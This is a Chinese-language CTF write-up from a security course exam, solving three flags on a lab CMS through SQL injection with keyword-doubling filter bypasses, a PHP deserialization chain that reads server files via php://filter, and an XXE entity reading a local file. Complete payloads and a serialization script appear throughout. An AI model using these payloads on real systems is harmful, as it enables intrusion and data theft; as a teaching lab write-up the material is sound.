## 系统安全攻防期末机试writeup

### flag1
- 进入网站About页面: `http://106.15.186.69:40248/article.php?id=2`  
  页面显示了SQL语句`string(34) "select * from article where id='2'"`

- 注意到URL尾部的查询参数`id=2`, 加入单引号`id=2'`后页面回显错误信息`string(35) "select * from article where id='2''" 404 not found!`，定位到注入点

- 使用`id=2' --+`顺利闭合引号，看到正确回显  

- 使用`id=2' order by 1 --+`语句探测表内字段数量，发现`or`被过滤，使用双写`oorrder by `绕过，`oorrder by 5`时报错回显，确定表内有四列

- 使用`id=0' union select 1,2,3,4 --+`发现错误回显分析，分析后发现`union, select, from`均被过滤，采用双写绕过；逗号被侦测到后直接返回，无法采用双写绕过，使用`select * from ((select 1)a join (select 2)b join (select 3)c join (select 4)d)`语句绕过逗号限制

- 使用`id=0' uniunionon selselectect * frfromom ((selselectect 1)a join (seleselectct 2)b join (seleselectct 3)c join (seleselectct 4)d) --+` 发现2，4字段回显(这时候已经基本确定和之前做过SQL注入的lab基本相似)

- 使用`id=0' uniunionon selselectect * frfromom ((selselectect 1)a join (seleselectct database())b join (seleselectct 3)c join (seleselectct 4)d) --+` 得到数据库名`coolsql`

- 使用`id=0' uniunionon selselectect * frfromom ((selselectect 1)a join (selselectect group_concat(TABLE_NAME) frfromom infoorrmation_schema.TABLES where TABLE_SCHEMA=database())b join (seleselectct 3)c join (seleselectct 4)d) --+` 得到两个数据表名 `article,flag` ，注意`information`里面的`or`也要双写

- 使用`id=0' uniunionon selselectect * frfromom ((selselectect 1)a join (selselectect group_concat(COLUMN_NAME) frfromom infoorrmation_schema.COLUMNS where TABLE_NAME='flag')b join (seleselectct 3)c join (seleselectct 4)d) --+` 得到`flag`表中列名`id,title,times,f11111aaaggg,test_content`

- 使用`id=0' uniunionon selselectect * frfromom ((selselectect 1)a join (selselectect f11111aaaggg frfromom flag)b join (seleselectct 3)c join (seleselectct 4)d) --+` 拿到 `flag1{78f5c2ab48b34408b830827693e2cd0c}` 

### flag2
- 在本地直接使用 `wget -r http://106.15.186.69:40248/`指令把网站可访问数据拉取下来，发现存在`robots.txt`协议文件，内容如下：
```
User-agent: *
Disallow: ssssssee333r.php
```

- 访问`http://106.15.186.69:40248/ssssssee333r.php`得到如下代码：
```
<?php
error_reporting(1);
highlight_file(__FILE__);
class Lab
{
    public $source;
    public function __toString()
    {
        $content = base64_encode(file_get_contents($this->source));
        echo $content;
    }

    public function __wakeup()
    {
        if(preg_match('/http|https|file:|gopher|dict|art|\.\.|fllllllaaaaaag/i',$this->source)) {
            die('hacker!');
        }
    }
}
if(isset($_GET['a']))
{
    $a = unserialize($_GET['a']);
}
?>
```


- 观察发现有可利用的POI漏洞，`preg_match('/http|https|file:|gopher|dict|art|\.\.|fllllllaaaaaag/i',$this->source)`此处函数调用将会把`$this->resource`作为字符串处理，如果`$this->resource`为`Lab`对象实例，则将会调用其中的`__toString()`魔法方法，从而达到读取服务器文件的目的，几次尝试后发现flag藏在`write.php`文件中，构造如下  

```
<?php

class Lab
{
    public $source;
    public function __toString()
    {
        $content = base64_encode(file_get_contents($this->source));
        echo $content;
    }

    public function __wakeup()
    {
        if(preg_match('/http|https|file:|gopher|dict|art|\.\.|fllllllaaaaaag/i',$this->source)) {
            die('hacker!');
        }
    }
}

$e = new Lab();
$e->source = "php://filter/resource=write.php";

$lab = new Lab();
$lab->source = $e;
echo serialize($lab);

// O:3:"Lab":1:{s:6:"source";O:3:"Lab":1:{s:6:"source";s:31:"php://filter/resource=write.php";}}
?>
```


- 构造访问`http://106.15.186.69:40248/ssssssee333r.php?a=O:3:%22Lab%22:1:{s:6:%22source%22;O:3:%22Lab%22:1:{s:6:%22source%22;s:31:%22php://filter/resource=write.php%22;}}`得到`write.php`源代码如下：
```
<!DOCTYPE html>
<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="description" content="">
    <meta name="author" content="">
    <title>CoolCms</title>
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link href="./css/1.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
  </head>

  <body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="./index.php">CoolCms</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="./index.php">Home</a></li>
            <li><a href="./article.php">About</a></li>
            <li class="active"><a href="./write.php">Write</a></li>
            <li><a href="">Contact</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <div class="container">
          <form action="./write.php" method="POST">
            <div class="form-group">
              <label for="content">Content</label>
              <textarea class="form-control" id="content" name="content" rows="6" placeholder="
                <code>
                  <body>Hello World!</body>
                </code>"></textarea>
            </div>
          <button class="btn btn-primary">Submit</button>
            <?php
            error_reporting(0);
	    #flag2{0d0050b4286325575089f033f3293a38}
	    #flag3 in /home/fllllllaaaaaag
            if(isset($_POST['content']) and $_POST['content'] != "") 
            {
		$content = $_POST['content'];    
		$tmp = strtolower($_POST['content']);
		$array = array('article','write');
		foreach ($array as $value)
		{	
    			if (substr_count($tmp, $value) > 0)
    			{		
        			exit('You are Bad!');
    			}
		}
	        $dom = new DOMDocument;
		$dom->preserveWhiteSpace = false;
		$dom->formatOutput = true;
		$dom->loadXML($content,LIBXML_NOENT);
		echo "<div class=\"container\">";
		echo $dom->saveXML();
	    	echo "</div>";
	    }
          ?>
        </form>
    </div>
</body></html>
```

- 得到 `flag2{0d0050b4286325575089f033f3293a38}`


### flag3
- 根据上面的信息知道`flag3`的位置`/home/fllllllaaaaaag`，并且发现XXE漏洞，构造如下XML：
```
<!DOCTYPE message [
    <!ENTITY test SYSTEM "file:///home/fllllllaaaaaag">
]>
<message>&test;</message>
```

- 在Write页面提交得到 `flag3{2ab3de3afb57c76aa4b10af3dabd2454}`